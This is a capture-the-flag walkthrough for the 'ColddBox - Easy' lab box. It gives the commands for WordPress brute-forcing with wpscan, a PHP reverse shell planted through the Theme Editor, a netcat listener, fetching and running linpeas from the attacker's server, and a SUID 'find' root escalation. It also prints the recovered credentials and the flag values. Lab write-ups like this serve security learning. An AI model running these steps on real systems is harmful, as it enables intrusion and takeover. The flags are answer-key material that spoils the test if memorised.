# ColddBox - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.62.181

feroxbuster -u http://10.10.62.181 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

cmseek

wpscan --url http://10.10.62.181/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames C0ldd
#brute-force login for C0ldd user

vim reverse-shell.php

#setup listener for reverse-shell
nc -nvlp 4444
#we get reverse shell

python3 -c 'import pty;pty.spawn("/bin/bash")'

cd /tmp

#in attacker machine
python3 -m http.server

#in reverse-shell
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#SUID exploit for find from GTFObins
/usr/bin/find . -exec /bin/sh -p \; -quit

#we have root shell now
```

* Open ports & services:

  * 80 - http - Apache httpd 2.4.18 (Ubuntu)
  * 4512 - ssh - OpenSSH 7.2p2

* The webpage on port 80 leads us to a blog titled 'ColddBox'; we can start enumerating the web directories simultaneously.

* Using ```cmseek```, we can confirm that the webpage is using WordPress version 4.1.31

* Out of all the directories enumerated, a few pages of interest are /hidden and /wp-login.php

* In /hidden, we get the following message:

```markdown
U-R-G-E-N-T
C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip
```

* From this, we get three possible usernames - C0ldd, Hugo and Philip.

* We can use ```wpscan``` tool and attempt to brute-force login.

* Using brute-force, we get the creds C0ldd:9876543210

* Now, as we have access to the Wordpress dashboard, we can get reverse shell using the Theme Editor.

* Navigating to the Theme Editor, we can edit the 404 page for 'twentyfifteen' theme, and add our PHP reverse-shell code; save the file after editing.

* Setup listener and navigate to <http://10.10.62.181/wp-content/themes/twentyfifteen/404.php> to activate the reverse shell.

* We get shell as 'www-data'; we can now enumerate using 'linpeas'.

* Now, while analyzing Wordpress files in ```/var/www/html/wp-config.php```, linpeas shows the creds c0ldd:cybersecurity

* Also, linpeas shows that the 'find' binary has SUID bit set.

* From GTFObins, we can get the SUID exploit for find - executing it gives us root - now we can get both flags.

```markdown
1. user.txt - RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

2. root.txt - wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```
